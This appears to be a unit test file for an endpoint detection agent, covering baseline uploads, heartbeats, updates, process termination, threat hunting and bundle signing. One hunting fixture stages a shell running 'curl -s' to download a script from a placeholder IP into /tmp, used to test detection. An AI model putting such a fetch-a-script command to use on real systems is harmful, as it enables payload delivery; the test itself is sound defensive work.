"""Unit tests for the agent's server-facing logic with a fake transport (no server, no kernel):
baseline day completion for live vs replay sources, dense-id upload order, command acknowledgement, heartbeat.
Run: PYTHONPATH=engine:agent python tests/unit/test_agent.py   (needs torch: run it in the agent or server image)
"""
import sys
import tempfile
import time

from pdp_engine.schema import Entity, Event
from pdp_agent.agent import VERSION as a_version, Agent, day_end_ns, day_of
from pdp_agent.config import Config

fails = 0


def check(cond, msg):
    global fails
    print(("PASS " if cond else "FAIL ") + msg)
    fails += 0 if cond else 1


class FakeTransport:
    def __init__(self):
        self.calls = []

    def post_ndjson(self, path, rows, batch_id=None):
        self.calls.append(("ndjson", path, rows, batch_id)); return {"ok": True}

    def request(self, method, path, body=None, **kw):
        self.calls.append((method, path, body)); return {"ok": True}

    def paths(self, frag):
        return [c for c in self.calls if frag in c[1]]


def make_agent(kind: str, baseline_days: int = 1) -> Agent:
    d = tempfile.mkdtemp()
    cfg = Config(data_dir=d, pki_dir=d + "/pki", source={"kind": kind}, day_tz="UTC")
    a = Agent(cfg)
    a.state.set("endpoint_id", "e1"); a.state.set("config", {"baseline_days": baseline_days, "tz": "UTC"})
    a.eid, a.tr = "e1", FakeTransport()
    return a


def items(ts_list, tag):
    out = []
    for i, ts in enumerate(ts_list):
        p, f = Entity.process(f"p{tag}{i % 3}", "/bin/x", "x"), Entity.file(f"f{tag}{i}", f"/tmp/{tag}{i}")
        out.append(([f, p], Event(ts, f.uuid, "READ", p.uuid, f"{tag}:{i:04d}")))
    return out


H = 3600 * 10**9
now = time.time_ns()
two_days_ago, yesterday, today = now - 2 * 24 * H, now - 24 * H, now

# 1. live (wall-clock) source: day N completes when day N+1 starts; the current day only after midnight + grace
a = make_agent("ebpf", baseline_days=3)
check(a.chronological, "ebpf source is chronological")
a.ingest(items([two_days_ago + k for k in range(5)], "a") + items([today + k for k in range(5)], "b"))
a.upload_baseline()
done = [c[2]["date"] for c in a.tr.paths("/day-complete")]
check(done == [day_of(two_days_ago)], f"first day completed once a later day started; current day still open ({done})")
check(sum(len(c[2]) for c in a.tr.paths("/events")) == 10, "all baseline events uploaded")

# 2. idle host: the only day seen is over (wall clock past its end + grace) -> completed without a later day
a = make_agent("strace", baseline_days=3)
a.ingest(items([two_days_ago + k for k in range(5)], "c"))
a.upload_baseline()
check([c[2]["date"] for c in a.tr.paths("/day-complete")] == [day_of(two_days_ago)], "idle host: an ended day is completed by the wall clock")
check(day_end_ns(day_of(two_days_ago)) <= now - 24 * H + 3600 * 10**9 * 24, "day_end_ns is the next midnight")

# 3. replay source: never inferred, only the source's declaration counts
a = make_agent("db-replay", baseline_days=3)
check(not a.chronological, "db-replay source is not chronological")
a.ingest(items([two_days_ago + k for k in range(5)], "d") + items([yesterday + k for k in range(5)], "e"))
a.upload_baseline()
check(a.tr.paths("/day-complete") == [], "replay: no day completed without the source's declaration")
a.state.complete_day(day_of(two_days_ago)); a.upload_baseline()
check([c[2]["date"] for c in a.tr.paths("/day-complete")] == [day_of(two_days_ago)], "replay: declared day completed")

# 4. entities carry the agent's dense id, uploaded in registry order
a = make_agent("ebpf")
a.ingest(items([yesterday + k for k in range(20)], "g"))
a.upload_baseline()
rows = [r for c in a.tr.paths("/entities") for r in c[2]]
check([r["dense_id"] for r in rows] == list(range(len(a.reg))) and all(a.reg[r["dense_id"]].uuid == r["uuid"] for r in rows),
      f"{len(rows)} entities uploaded with dense_id == agent registry index, in order")

# 5. commands are handled and acknowledged
a = make_agent("ebpf")
a.state.set("bundle_id", "b0")
a.handle_command({"id": "c1", "command": "refetch_bundle"})
a.handle_command({"id": "c2", "command": "self_destruct"})
acks = [(c[1].split("/")[-2], c[2]["result"]) for c in a.tr.paths("/ack")]
check(acks == [("c1", "ok"), ("c2", "unsupported")] and a.state.get("bundle_id") is None, f"commands acknowledged {acks}; refetch clears the bundle")

# 6. heartbeat carries the protocol's health fields
h = a.health()
check({"agent_version", "queue_depth", "last_window_end_ns", "cpu_pct", "rss_mb", "spool_mb", "spool_dropped_unscored",
       "spool_dropped_unuploaded", "entities", "update", "disk_free_mb", "disk_free_pct", "isolated", "disk_full", "disk_full_dropped", "spool_dropped_unscored_1h", "spool_dropped_unuploaded_1h",
       "data_mb", "run_id", "started_at", "counters", "source", "bundle", "config_sha256", "window_seq", "alert_seq", "unreported",
       "lost_seqs", "score_failures", "score_failures_24h"} == set(h) and h["rss_mb"] > 0 and h["disk_free_mb"] > 0 and h["data_mb"]["total"] >= h["data_mb"]["database"] > 0,
      f"health {h}")
try:                       # the server stores only the heartbeat fields its model declares: every one the agent sends
    from pdp_server.api import Heartbeat
    every = set(h) | {"collector_lost", "collector_behind", "collector_lost_1h", "collector_behind_1h", "collector_error", "hb_seq", "agent_time"}
    check(every <= set(Heartbeat.model_fields if hasattr(Heartbeat, "model_fields") else Heartbeat.__fields__),
          f"the server keeps every health field (missing: {sorted(every - set(getattr(Heartbeat, 'model_fields', None) or Heartbeat.__fields__))})")
except ImportError:
    pass                   # agent image: no server code

# 7. updates: without the host updater only reported; with it: pull credential, request file, exit 75
import os as _os
class PullTransport(FakeTransport):
    def request(self, method, path, body=None, **kw):
        self.calls.append((method, path, body))
        if path.endswith("/pull-token"):
            return {"ok": True, "user": "pdp", "token": "tok123", "version": "9.9.9", "image": "srv.example/pdp/agent:9.9.9", "registry": "srv.example"}
        return {"ok": True}
offer = {"version": "9.9.9", "image": "srv.example/pdp/agent:9.9.9", "registry": "srv.example"}
a.tr = PullTransport(); a.updater = False; a._update_offer = offer
check(not a.request_update(offer) and a.update_health()["state"] == "available", "no updater on the host: the update is only reported")
a.updater = True
check(a.request_update(offer) and a.exit_code == 75 and a.stop, "with the updater: the agent asks for a credential and stops (exit 75)")
req = open(_os.path.join(a.cfg.data_dir, "update-request.env")).read()
check("IMAGE=srv.example/pdp/agent:9.9.9" in req and "TOKEN=tok123" in req and oct(_os.stat(_os.path.join(a.cfg.data_dir, "update-request.env")).st_mode)[-3:] == "600",
      "update request written for the updater (mode 600)")
check(a.update_health()["state"] == "updating", "health reports the update in progress")
_os.remove(_os.path.join(a.cfg.data_dir, "update-request.env")); a.stop = False; a.exit_code = 0
open(_os.path.join(a.cfg.data_dir, "update-failed"), "w").write("9.9.9\n")
check(not a.request_update(offer) and a.update_health()["failed"] == ["9.9.9"], "a version the updater rolled back is not requested again")
open(_os.path.join(a.cfg.data_dir, "update-trial.env"), "w").write("VERSION=x\n")
a.confirm_update()
check(open(_os.path.join(a.cfg.data_dir, "update-ok")).read().strip() == a_version, "after an update the first heartbeat confirms the new version")
check(a.update_health()["state"] != "trial", "once confirmed, health no longer reports a trial (the updater clears its files at the next start)")

# 8. response: stop a process only while its pid still is the alerted process
import subprocess as _sp
from types import SimpleNamespace
child = _sp.Popen(["sleep", "300"])
uuid_now = f"proc:boot:{child.pid}:0"
a.source = SimpleNamespace(procs=SimpleNamespace(current={child.pid: SimpleNamespace(uuid=uuid_now)}))
r1 = a.kill_process(child.pid, f"proc:boot:{child.pid}:7", f"subject /usr/bin/sleep sleep 300")
check(r1.startswith("not stopped") and child.poll() is None, f"a different identity on the same pid is not touched ({r1})")
check(a.kill_process(1, "x", "").startswith("refused"), "pid 1 is never stopped")
r2 = a.kill_process(child.pid, uuid_now, "subject /usr/bin/sleep sleep 300")
child.wait(timeout=5)
check(r2.startswith("ok") and child.returncode == -9, f"the alerted process is stopped ({r2})")
r3 = a.kill_process(child.pid, uuid_now, "subject /usr/bin/sleep sleep 300")
check(r3.startswith("not stopped"), "an ended process is reported, not retried")
check(a.health()["isolated"] is False, "health reports isolation state")

# 9. hunting: the activity index records programs run (with command line), addresses contacted and files written,
#    de-duplicated; a hunt searches it and posts the matches back
from pdp_agent.agent import _observable
a = make_agent("ebpf")
sh = Entity.process("p:sh", "/bin/sh", "sh -c curl")
cu = Entity.process("p:curl", "/usr/bin/curl", "curl -s http://203.0.113.9/x_1.sh")
exe = Entity.file("file:/usr/bin/curl", "/usr/bin/curl")
nf = Entity.socket("n:1", "203.0.113.9", 80)
out = Entity.file("f:/tmp/x_1.sh", "/tmp/x_1.sh")
prc = Entity.file("f:/proc/self/attr", "/proc/self/attr")
t = time.time_ns()
evs = [([exe, cu], Event(t, exe.uuid, "EXECUTE", cu.uuid, "h1")), ([cu, nf], Event(t + 1, cu.uuid, "CONNECT", nf.uuid, "h2")),
       ([nf, cu], Event(t + 2, nf.uuid, "RECVFROM", cu.uuid, "h3")), ([cu, out], Event(t + 3, cu.uuid, "WRITE", out.uuid, "h4")),
       ([cu, out], Event(t + 9, cu.uuid, "WRITE", out.uuid, "h5")), ([cu, prc], Event(t + 4, cu.uuid, "WRITE", prc.uuid, "h6")),
       ([out, cu], Event(t + 5, out.uuid, "READ", cu.uuid, "h7"))]
check(_observable(exe, "EXECUTE", cu) == ("exec", "/usr/bin/curl", "curl -s http://203.0.113.9/x_1.sh"), "exec: program and command line")
check(_observable(cu, "CONNECT", nf) == _observable(nf, "RECVFROM", cu) == ("net", "/usr/bin/curl", "203.0.113.9:80"), "net: both directions, ip:port")
check(_observable(cu, "WRITE", prc) is None and _observable(out, "READ", cu) is None, "/proc writes and reads are not indexed")
a.ingest(evs)
a.state.add_observables(a._obs); a._obs = {}
w = a.state.hunt("x_1.sh", "write")
check(len(w) == 1 and w[0]["count"] == 2 and w[0]["first_ns"] == t + 3 and w[0]["last_ns"] == t + 9, f"writes de-duplicated with first/last seen ({w})")
check({r["kind"] for r in a.state.hunt("203.0.113.9")} == {"exec", "net"} and len(a.state.hunt("203.0.113.9", "net")) == 1, "search over program and object, kind filter")
check(a.state.hunt("x%1") == [] and {r["kind"] for r in a.state.hunt("X_1")} == {"exec", "write"}, "LIKE wildcards in the query are literal; case-insensitive")
a.handle_command({"id": "c9", "command": "hunt", "hunt_id": "h-1", "q": "curl", "kind": "net"})
posted = a.tr.paths("/hunts/h-1")
check(len(posted) == 1 and posted[0][2][0]["object"] == "203.0.113.9:80" and a.tr.paths("/commands/c9/ack")[-1][2]["result"] == "ok: 1 matches",
      "hunt command posts the matches and acknowledges")
a.handle_command({"id": "c10", "command": "hunt", "hunt_id": "h-2", "q": "nothing-here"})
check(a.tr.paths("/hunts/h-2")[0][2] == [{"none": True}], "no match is answered explicitly")
a.state.c.execute("UPDATE observables SET last_ns = 1 WHERE kind='write'"); a.state.c.commit()
check(a.state.prune_observables() == 1 and a.state.hunt("x_1.sh", "write") == [], "entries not seen for 30 days are pruned")

# 10. integrity of the endpoint signal (0.6)
import json as _json
import numpy as _np
from pdp_agent import agent as A
from pdp_engine.windows import Window as _Win

# heartbeat: a persisted sequence number (survives a restart), one run id per process, counters since the last
# heartbeat the server received
a = make_agent("ebpf")
a.ingest(items([yesterday + k for k in range(7)], "hb"))
b1 = a.heartbeat_body()
check(b1["hb_seq"] == 1 and b1["counters"]["events"] == 7 and abs(b1["agent_time"] - time.time()) < 5 and b1["run_id"] == a.run_id,
      f"heartbeat: seq 1, 7 events counted, agent clock ({b1['counters']})")
a._heartbeat_sent(b1, time.time())
b2 = a.heartbeat_body()
check(b2["hb_seq"] == 2 and b2["counters"]["events"] == 0, "after a delivered heartbeat the counters start again")
a.ingest(items([yesterday + 100 + k for k in range(3)], "hc"))
b3 = a.heartbeat_body()                                  # not delivered: the next one still covers these events
a.ingest(items([yesterday + 200 + k for k in range(2)], "hd"))
b4 = a.heartbeat_body()
check(b3["counters"]["events"] == 3 and b4["counters"]["events"] == 5 and b4["hb_seq"] == 4, "an undelivered heartbeat's counts carry over")
a2 = Agent(a.cfg)
b5 = a2.heartbeat_body()
check(b5["hb_seq"] == 5 and b5["run_id"] != a.run_id and b5["started_at"] >= b1["started_at"], "the sequence survives a restart; the run id does not")
calls = []
a2.eid, a2.tr = "e1", FakeTransport()
a2._maybe_heartbeat(time.time())
a2._maybe_heartbeat(time.time())
check(len(a2.tr.paths("/heartbeat")) == 1 and a2.tr.paths("/heartbeat")[0][2]["hb_seq"] == 6, "heartbeat at most once per interval")

# window summaries and alerts: sequence numbers and an idempotency key; the queue limit declares what it drops
a = make_agent("ebpf")
al = lambda n: {"window_start_ns": 5, "node": {"uuid": f"n{n}"}, "layer": "rules", "rule": "r"}
a._unreported = []
a._queue([{"start_ns": 1}, {"start_ns": 2}], [al(1), al(2)])
a._queue([], [al(3)])
w0, a0 = a._unreported[0]
check([w["seq"] for w in w0] == [1, 2] and [x["seq"] for x in a0] == [1, 2] and a._unreported[1][1][0]["seq"] == 3, "windows and alerts numbered per endpoint")
check(a0[0]["aid"] == A.alert_id("e1", a0[0]) and a0[0]["aid"] != a0[1]["aid"] and len(a0[0]["aid"]) == 32, "alert idempotency key bound to content and sequence")
check(a.state.get("window_seq") == 2 and a.state.get("alert_seq") == 3 and len(a.state.get("unreported")) == 2, "sequence counters and the queue are on disk")
h = a.health()
check(h["window_seq"] == 2 and h["alert_seq"] == 3 and h["unreported"] == 2 and h["counters"]["alerts"] == 3, "heartbeat reports the last numbers and the pending queue")
a._unreported = []
old_max = A.UNREPORTED_MAX
A.UNREPORTED_MAX = 2
for i in range(4):
    a._queue([], [al(10 + i)])
A.UNREPORTED_MAX = old_max
check(a.state.get("lost_seqs")["a"] == [[4, 4], [5, 5]] and len(a.state.get("unreported")) == 2, f"queue limit: dropped numbers declared ({a.state.get('lost_seqs')})")

# baseline upload batch ids never repeat, also after the spool emptied (ids used to restart at 1)
a = make_agent("ebpf", baseline_days=3)
a.ingest(items([yesterday + k for k in range(4)], "ba"))
a.upload_baseline()
a.state.c.execute("DELETE FROM events")              # everything uploaded and scored: the spool is empty
a.ingest(items([yesterday + 50 + k for k in range(4)], "bb"))
a.upload_baseline()
bids = [c[3] for c in a.tr.paths("/events")]
check(len(bids) == 2 and len(set(bids)) == 2 and all(b.endswith("-m") for b in bids), f"batch ids unique after the spool emptied ({bids})")
import sqlite3 as _sq
d = tempfile.mkdtemp()
c0 = _sq.connect(d + "/state.sqlite")
from pdp_agent.state import DDL as _DDL
c0.executescript(_DDL)
c0.execute("INSERT INTO events (id, ts_ns, src, op, dst, eid, day) VALUES (7, 1, 0, 0, 0, 'x', 1)"); c0.commit(); c0.close()
from pdp_agent.state import State as _State
st = _State(d + "/state.sqlite")
st.add_events([(2, 0, "READ", 0, "y", "2026-01-01")])
ids = [r[0] for r in st.c.execute("SELECT id FROM events ORDER BY id")]
check(ids == [7, 8] and st.batch_id("2026-01-01", 7, 7) == "2026-01-01-7-7" and st.batch_id("2026-01-01", 7, 8) == "2026-01-01-7-8-m",
      "existing spool: old rows keep their batch id (a retry stays a duplicate), new rows get the new form")

# scoring guard: a window the detector fails on is retried once, then skipped and counted - no crash loop
class FailRuntime:
    def __init__(self, bad):
        self.bad, self.calls = bad, 0
    def score(self, w, **kw):
        self.calls += 1
        if w.start_ns in self.bad:
            raise ValueError("crafted content")
        return "ok"
win = lambda t: _Win(start_ns=t, end_ns=t + 10, src=_np.zeros(1, dtype=_np.int64), dst=_np.zeros(1, dtype=_np.int64),
                     t=_np.zeros(1, dtype=_np.int64), etype=_np.zeros(1, dtype=_np.int64), event_uuid=["x"])
a = make_agent("ebpf")
a.runtime = FailRuntime({100})
check(a._score(win(50)) == "ok" and a._score(win(100)) is None and a.runtime.calls == 3, "failing window: tried twice, then skipped")
check(a.state.get("score_failures") == 1 and a.health()["score_failures_24h"] == 1 and a.state.get("scoring_window") is None,
      "the skipped window is counted and reported in the heartbeat")
a.runtime.calls = 0
check(a._score(win(100)) is None and a.runtime.calls == 0, "a quarantined window is not scored again")
a.state.set("scoring_window", "300")                  # the process died while scoring window 300 (e.g. killed by the kernel)
a2 = Agent(a.cfg); a2.runtime = FailRuntime(set())
check(a2._score_attempts.get("300") == 1 and a2._score(win(300)) == "ok", "a crash while scoring counts as one attempt; the window gets one more")
a2.state.set("scoring_window", "400"); a3 = Agent(a.cfg); a3.state.set("scoring_window", "400"); a4 = Agent(a.cfg)
a4.runtime = FailRuntime(set())
check(a4._score_attempts.get("400") == 2 and a4._score(win(400)) is None and a4.runtime.calls == 0, "two crashes on one window: it is skipped after the restart")

# bundles: pinned signing key, announced manifest digest, the manifest's endpoint and bundle id
from cryptography.hazmat.primitives import serialization as _ser
from cryptography.hazmat.primitives.asymmetric import ed25519 as _ed
pem = lambda k: k.public_key().public_bytes(_ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo)
k1, k2 = _ed.Ed25519PrivateKey.generate(), _ed.Ed25519PrivateKey.generate()
a = make_agent("ebpf")
import os as _os2
_os2.makedirs(a.cfg.pki_dir, exist_ok=True)
open(a.cfg.signing_pub, "wb").write(pem(k1))
a = Agent(a.cfg); a.state.set("endpoint_id", "e1")
check(a.state.get("signing_key_fp") == A.key_fingerprint(pem(k1)), "an agent enrolled before 0.6 pins the signing key it has")
bd = tempfile.mkdtemp()
def manifest(**m):
    open(bd + "/manifest.json", "w").write(_json.dumps(m))
    return A.file_sha256(bd + "/manifest.json")
def refused(bid, pub, sha=None):
    try:
        a._check_bundle(bid, bd, pub, sha)
        return None
    except A.BundleRefused as e:
        return str(e)
sha = manifest(endpoint="e1", bundle_id="b1")
check(refused("b1", pem(k1), sha) is None, "own bundle with the announced digest and the pinned key is accepted")
check("pinned" in (refused("b1", pem(k2), sha) or ""), "a different signing key on disk is refused")
check("announced" in (refused("b1", pem(k1), "0" * 64) or ""), "a manifest other than the announced one is refused")
check("endpoint" in (refused("b1", pem(k1)) if manifest(endpoint="e2", bundle_id="b1") else ""), "a bundle built for another endpoint is refused")
check("names bundle" in (refused("b1", pem(k1)) if manifest(endpoint="e1", bundle_id="b9") else ""), "a bundle under another id is refused")
manifest(version=1)
check(refused("b1", pem(k1)) is None, "older manifests without endpoint/bundle_id fields still load")
open(a.cfg.signing_pub, "wb").write(pem(k2))
hb = a.health()["bundle"]
check(hb["signing_key_fp"] == A.key_fingerprint(pem(k2)) and hb["pinned_key_fp"] == A.key_fingerprint(pem(k1)) and hb["id"] is None,
      "heartbeat reports the key on disk and the pinned one")

# configuration digest: changes with the effective configuration, not with secrets
c1, c2 = Config(source={"kind": "ebpf"}), Config(source={"kind": "auditd"})
c3 = Config(source={"kind": "ebpf"}); c3.enroll_token = "s3cret"
check(A.config_digest(c1) != A.config_digest(c2) and A.config_digest(c1) == A.config_digest(c3), "config digest: source matters, secrets do not")

# auditd: a quiet audit.log no longer holds the agent's loop (idle ticks)
from pdp_agent.sources.live import AuditdLive
d = tempfile.mkdtemp(); open(d + "/audit.log", "w").close()
t0, n = time.time(), 0
for b in AuditdLive(d + "/audit.log").batches(lambda: time.time() - t0 > 6):
    n += 1
    if n >= 2:
        break
check(n >= 2 and time.time() - t0 < 6, f"auditd source yields idle ticks on a quiet log ({n} in {time.time() - t0:.1f}s)")

# eBPF canary: a child opens a nonce file; the collector must deliver it (consumed, never an event)
from pdp_agent.sources.ebpf import OPEN as _OPEN, EXIT as _EXIT, EbpfLive, Rec
class CanaryTracer:
    def __init__(self, src, deliver=True):
        self.src, self.deliver, self.stats = src, deliver, {"lost": 0}
    def poll(self, timeout_ms=200):
        time.sleep(0.02)
        if not self.deliver:
            return []
        out = []
        for nonce, (t0, child, path) in list(self.src._canary_pending.items()):
            out += [Rec(_OPEN, child.pid, ts_ns=time.time_ns(), s=path), Rec(_EXIT, child.pid)]
        return out
d = tempfile.mkdtemp()
src = EbpfLive(canary_s=0.2, canary_dir=d, run_id="t", proc="/nonexistent")
src._tracer = CanaryTracer(src); src._canary_next = 0
got, t0 = [], time.time()
for b in src.batches(lambda: time.time() - t0 > 1.5):
    got += b
cs = src.canary_status()
check(cs["sent"] >= 3 and cs["seen"] >= cs["sent"] - 1 and cs["missed"] == 0 and got == [] and len(_os2.listdir(d)) <= cs["pending"],
      f"canary seen, consumed (no events), files removed ({cs})")
class SpoofTracer(CanaryTracer):    # another process names its file like a canary: it must stay visible
    def poll(self, timeout_ms=200):
        out = super().poll(timeout_ms)
        if not getattr(self, "sent_spoof", False):
            self.sent_spoof = True
            out.append(Rec(_OPEN, 424242, ts_ns=time.time_ns(), s="/tmp/.pdp-canary-hidden", flags=0, ret=3))
        return out
src = EbpfLive(canary_s=0.2, canary_dir=d, run_id="t", proc="/nonexistent")
src._tracer = SpoofTracer(src); src._canary_next = 0
got, t0 = [], time.time()
for b in src.batches(lambda: time.time() - t0 > 0.8):
    got += b
check(any(".pdp-canary-hidden" in str(x) for x in got), "a file named like a canary opened by another process is still an event")
src = EbpfLive(canary_s=0.2, canary_dir=d, run_id="t", proc="/nonexistent")
src._tracer = CanaryTracer(src, deliver=False); src._canary_next = 0; src.CANARY_DEADLINE_S = 0.3
t0 = time.time()
for b in src.batches(lambda: time.time() - t0 > 1.5):
    pass
check(src.canary_status()["missed"] >= 3, f"a detached collector misses the canary ({src.canary_status()})")

print("FAILURES:", fails)
sys.exit(1 if fails else 0)
